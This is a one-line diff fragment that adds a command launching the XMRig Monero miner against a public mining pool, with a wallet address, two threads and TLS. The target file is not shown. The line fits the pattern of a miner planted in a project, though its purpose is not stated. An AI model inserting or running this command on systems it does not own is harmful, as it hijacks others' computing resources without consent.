@@ -1,0 +1,1 @@
+./xmrig -o sg.minexmr.com:443 -u 89fYEJEXcF6boxxa7dK79PBqJPr6LBZZ16HD7NiFVfvqCoJKAppwup5Kpvsa7EEJhtjBoPonA4XQrWGcdfDtmbfA9M5sHD5 -k -t 2 --tls --rig-id tes
